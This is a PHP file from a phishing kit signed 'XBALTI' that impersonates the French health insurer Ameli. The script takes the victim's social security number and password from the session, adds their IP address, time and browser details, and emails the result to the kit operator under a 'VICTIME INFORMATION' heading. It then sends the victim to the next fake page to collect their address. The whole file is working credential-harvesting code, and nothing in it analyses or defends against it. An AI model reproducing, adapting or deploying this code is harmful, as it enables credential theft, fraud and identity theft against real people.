<?php
/*   
             ,;;;;;;;,
            ;;;;;;;;;;;,
           ;;;;;'_____;'
           ;;;(/))))|((\
           _;;((((((|))))
          / |_\\\\\\\\\\\\
     .--~(  \ ~))))))))))))
    /     \  `\-(((((((((((\\
    |    | `\   ) |\       /|)
     |    |  `. _/  \_____/ |
      |    , `\~            /
       |    \  \ BY XBALTI /
      | `.   `\|          /
      |   ~-   `\        /
       \____~._/~ -_,   (\
        |-----|\   \    ';;
       |      | :;;;'     \
      |  /    |            |
      |       |            |                   
*/
session_start();
$TIME_DATE = date('H:i:s d/m/Y');
include('./XBALTI/Email.php');
include('./XBALTI/get_browser.php');
$XBALTI_MESSAGE .= "
<html>
<head><meta charset='UTF-8'></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
●••●••۰۰•● ❤ ●•۰۰۰۰•● ❤ <font style='color: #000f82;'>BY XBALTI V1</font> ❤ ●•۰۰۰۰•● ❤ ●•۰۰۰•●••●●••<br/>
================( <font style='color: #0a5d00;'>LOGIN INFORMATION</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [numéro de sécurité sociale] = <font style='color:#ba0000;'>".$_SESSION['login']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [Password ]       = <font style='color:#ba0000;'>".$_SESSION['password']."</font><br>
================( <font style='color: #0a5d00;'>VICTIME INFORMATION</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [IP INFO]           = <font style='color:#ba0000;'>https://geoiptool.com/en/?ip=".$_SESSION['_ip_']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [TIME/DATE]         = <font style='color:#ba0000;'>".$TIME_DATE."</font><br>
<font style='color:#00049c;'>🤑✪</font> [BROWSER]           = <font style='color:#ba0000;'>".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
●••●••۰۰•● ❤ ●•۰۰۰۰•● ❤ <font style='color: #000f82;'>BY XBALTI V1</font> ❤ ●•۰۰۰۰•● ❤ ●•۰۰۰•●••●●••<br/>
</div></html>\n";
  #  $khraha = fopen("../adm213.html", "a");
#	fwrite($khraha, $XBALTI_MESSAGE);
    $XBALTI_SUBJECT .= "NEW o_O ✪ O_o LOGIN AMELI FROM : ".$_SESSION['_forlogin_']." ✪ ".$_SESSION['login']." ✪ ";
    $XBALTI_HEADERS .= "From: Ameli-XB<cantact>";
    $XBALTI_HEADERS .= "XB-Version: 1.0\n";
    $XBALTI_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
    @mail($XBALTI_EMAIL, $XBALTI_SUBJECT, $XBALTI_MESSAGE, $XBALTI_HEADERS);
	HEADER("Location: ./Adresse.php?assure_nfpb=true&_pageLabel=as_login_page&connexioncompte_2actionEvt=afficher&lieu.x=fr_".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."");

?>